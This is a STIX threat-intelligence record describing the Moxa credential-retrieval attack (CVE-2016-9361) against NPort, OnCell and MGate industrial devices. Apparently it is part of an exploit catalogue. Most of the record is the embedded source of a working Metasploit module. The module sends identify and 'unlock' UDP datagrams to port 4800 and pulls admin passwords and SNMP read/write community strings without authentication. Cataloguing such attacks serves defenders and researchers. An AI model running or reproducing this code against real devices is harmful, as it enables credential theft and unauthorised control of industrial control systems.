{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6d1a7de2-05a6-4a5f-aa05-905cbda45b6e",
    "created": "2024-08-14T16:22:21.906385Z",
    "modified": "2024-08-14T16:22:21.906389Z",
    "name": "Moxa Device Credential Retrieval",
    "description": " The Moxa protocol listens on 4800/UDP and will respond to broadcast or direct traffic.  The service is known to be used on Moxa devices in the NPort, OnCell, and MGate product lines.  Many devices with firmware versions older than 2017 or late 2016 allow admin credentials and SNMP read and read/write community strings to be retrieved without authentication.  This module is the work of Patrick DeSantis of Cisco Talos and K. Reid Wightman.  Tested on: Moxa NPort 6250 firmware v1.13, MGate MB3170 firmware 2.5 and NPort 5110 firmware 2.6.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/moxa_credentials_recovery.rb",
            "external_id": "moxa_credentials_recovery.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-9361"
        },
        {
            "source_name": "reference",
            "url": "https://www.digitalbond.com/blog/2016/10/25/serial-killers/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/reidmefirst/MoxaPass/blob/master/moxa_getpass.py"
        },
        {
            "source_name": "reference",
            "url": "https://ics-cert.us-cert.gov/advisories/ICSA-16-336-02"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Moxa Device Credential Retrieval',\n      'Description'    => %q{\n        The Moxa protocol listens on 4800/UDP and will respond to broadcast\n        or direct traffic.  The service is known to be used on Moxa devices\n        in the NPort, OnCell, and MGate product lines.  Many devices with\n        firmware versions older than 2017 or late 2016 allow admin credentials\n        and SNMP read and read/write community strings to be retrieved without\n        authentication.\n\n        This module is the work of Patrick DeSantis of Cisco Talos and K. Reid\n        Wightman.\n\n        Tested on: Moxa NPort 6250 firmware v1.13, MGate MB3170 firmware 2.5,\n        and NPort 5110 firmware 2.6.\n\n      },\n      'Author'         =>\n        [\n          'Patrick DeSantis <p[at]t-r10t.com>',\n          'K. Reid Wightman <reid[at]revics-security.com>'\n        ],\n\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2016-9361'],\n          [ 'BID', '85965'],\n          [ 'URL', 'https://www.digitalbond.com/blog/2016/10/25/serial-killers/'],\n          [ 'URL', 'https://github.com/reidmefirst/MoxaPass/blob/master/moxa_getpass.py' ],\n          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-336-02']\n        ],\n      'DisclosureDate' => '2015-07-28'))\n\n    register_options([\n      # Moxa protocol listens on 4800/UDP by default\n      Opt::RPORT(4800),\n      OptEnum.new(\"FUNCTION\", [true, \"Pull credentials or enumerate all function codes\", \"CREDS\",\n        [\n          \"CREDS\",\n          \"ENUM\"\n        ]])\n      ])\n  end\n\n  def fc() {\n    # Function codes\n    'ident'         =>  \"\\x01\",   # identify device\n    'name'          =>  \"\\x10\",   # get the \"server name\" of the device\n    'netstat'       =>  \"\\x14\",   # network activity of the device\n    'unlock1'       =>  \"\\x16\",   # \"unlock\" some devices, including 5110, MGate\n    'date_time'     =>  \"\\x1a\",   # get the device date and time\n    'time_server'   =>  \"\\x1b\",   # get the time server of device\n    'unlock2'       =>  \"\\x1e\",   # \"unlock\" 6xxx series devices\n    'snmp_read'     =>  \"\\x28\",   # snmp community strings\n    'pass'          =>  \"\\x29\",   # admin password of some devices\n    'all_creds'     =>  \"\\x2c\",   # snmp comm strings and admin password of 6xxx\n    'enum'          =>  \"enum\"    # mock fc to catch \"ENUM\" option\n  }\n  end\n\n  def send_datagram(func, tail)\n    if fc[func] == \"\\x01\"\n      # identify datagrams have a length of 8 bytes and no tail\n      datagram = fc[func] + \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\"\n      begin\n        udp_sock.put(datagram)\n        response = udp_sock.get(3)\n      rescue ::Timeout::Error\n      end\n      format_output(response)\n      # the last 16 bytes of the ident response are used as a form of auth for\n      # function codes other than 0x01\n      tail = response[8..24]\n    elsif fc[func] == \"enum\"\n      for i in (\"\\x02\"..\"\\x80\") do\n        # start at 2 since 0 is invalid and 1 is ident\n        datagram = i + \"\\x00\\x00\\x14\\x00\\x00\\x00\\x00\" + tail\n        begin\n          udp_sock.put(datagram)\n          response = udp_sock.get(3)\n        end\n        if response[1] != \"\\x04\"\n          vprint_status(\"Function Code: #{Rex::Text.to_hex_dump(datagram[0])}\")\n          format_output(response)\n        end\n      end\n    else\n      # all non-ident datagrams have a len of 14 bytes and include a tail that\n      # is comprised of bytes obtained during the ident\n      datagram = fc[func] + \"\\x00\\x00\\x14\\x00\\x00\\x00\\x00\" + tail\n      begin\n        udp_sock.put(datagram)\n        response = udp_sock.get(3)\n        if valid_resp(fc[func], response) == -1\n          # invalid response, so don't bother trying to parse it\n          return\n        end\n        if fc[func] == \"\\x2c\"\n          # try this, note it may fail\n          get_creds(response)\n        end\n        if fc[func] == \"\\x29\"\n        # try this, note it may fail\n        get_pass(response)\n        end\n        if fc[func] == \"\\x28\"\n        # try this, note it may fail\n        get_snmp_read(response)\n        end\n      rescue ::Timeout::Error\n      end\n      format_output(response)\n    end\n  end\n\n  # helper function for extracting strings from payload\n  def get_string(data)\n    str_end = data.index(\"\\x00\")\n    return data[0..str_end]\n  end\n\n  # helper function for extracting password from 0x29 FC response\n  def get_pass(response)\n    if response.length() < 200\n      print_error(\"get_pass failed: response not long enough\")\n      return\n    end\n    pass = get_string(response[200..-1])\n    print_good(\"password retrieved: #{pass}\")\n    store_loot(\"moxa.get_pass.admin_pass\", \"text/plain\", rhost, pass)\n    return pass\n  end\n\n  # helper function for extracting snmp community from 0x28 FC response\n  def get_snmp_read(response)\n    if response.length() < 24\n      print_error(\"get_snmp_read failed: response not long enough\")\n      return\n    end\n    snmp_string = get_string(response[24..-1])\n    print_good(\"snmp community retrieved: #{snmp_string}\")\n    store_loot(\"moxa.get_pass.snmp_read\", \"text/plain\", rhost, snmp_string)\n  end\n\n  # helper function for extracting snmp community from 0x2C FC response\n  def get_snmp_write(response)\n    if response.length() < 64\n      print_error(\"get_snmp_write failed: response not long enough\")\n      return\n    end\n    snmp_string = get_string(response[64..-1])\n    print_good(\"snmp read/write community retrieved: #{snmp_string}\")\n    store_loot(\"moxa.get_pass.snmp_write\", \"text/plain\", rhost, snmp_string)\n  end\n\n  # helper function for extracting snmp and pass from 0x2C FC response\n  # Note that 0x2C response is basically 0x28 and 0x29 mashed together\n  def get_creds(response)\n    if response.length() < 200\n      # attempt failed. device may not be unlocked\n      print_error(\"get_creds failed: response not long enough. Will fall back to other functions\")\n      return -1\n    end\n    get_snmp_read(response)\n    get_snmp_write(response)\n    get_pass(response)\n  end\n\n  # helper function to verify that the response was actually for our request\n  # Simply makes sure the response function code has most significant bit\n  # of the request number set\n  # returns 0 if everything is ok\n  # returns -1 if functions don't match\n  def valid_resp(func, resp)\n    # get the query function code to an integer\n    qfc = func.unpack(\"C\")[0]\n    # make the response function code an integer\n    rfc = resp[0].unpack(\"C\")[0]\n    if rfc == (qfc + 0x80)\n      return 0\n    else\n      return -1\n    end\n  end\n\n  def format_output(resp)\n    # output response bytes as hexdump\n    vprint_status(\"Response:\\n#{Rex::Text.to_hex_dump(resp)}\")\n  end\n  def check\n    connect_udp\n\n    begin\n      # send the identify command\n      udp_sock.put(\"\\x01\\x00\\x00\\x08\\x00\\x00\\x00\\x00\")\n      response = udp_sock.get(3)\n    end\n\n    if response\n      # A valid response is 24 bytes, starts with 0x81, and contains the values\n      # 0x00, 0x90, 0xe8 (the Moxa OIU) in bytes 14, 15, and 16.\n      if response[0] == \"\\x81\" && response[14..16] == \"\\x00\\x90\\xe8\" && response.length == 24\n        format_output(response)\n        return Exploit::CheckCode::Appears\n      end\n    else\n      vprint_error(\"Unknown response\")\n      return Exploit::CheckCode::Unknown\n    end\n    cleanup\n\n    Exploit::CheckCode::Safe\n  end\n\n  def run\n    unless check == Exploit::CheckCode::Appears\n      print_error(\"Aborted because the target does not seem vulnerable.\")\n      return\n    end\n\n    function = datastore[\"FUNCTION\"]\n\n    connect_udp\n\n    # identify the device and get bytes for the \"tail\"\n    tail = send_datagram('ident', nil)\n\n    # get the \"server name\" from the device\n    send_datagram('name', tail)\n\n    # \"unlock\" the device\n    # We send both versions of the unlock FC, this doesn't seem\n    # to hurt anything on any devices tested\n    send_datagram('unlock1', tail)\n    send_datagram('unlock2', tail)\n\n    if function == \"CREDS\"\n      # grab data\n      send_datagram('all_creds', tail)\n      send_datagram('snmp_read', tail)\n      send_datagram('pass', tail)\n    elsif function == \"ENUM\"\n      send_datagram('enum', tail)\n    else\n      print_error(\"Invalid FUNCTION\")\n    end\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-28"
}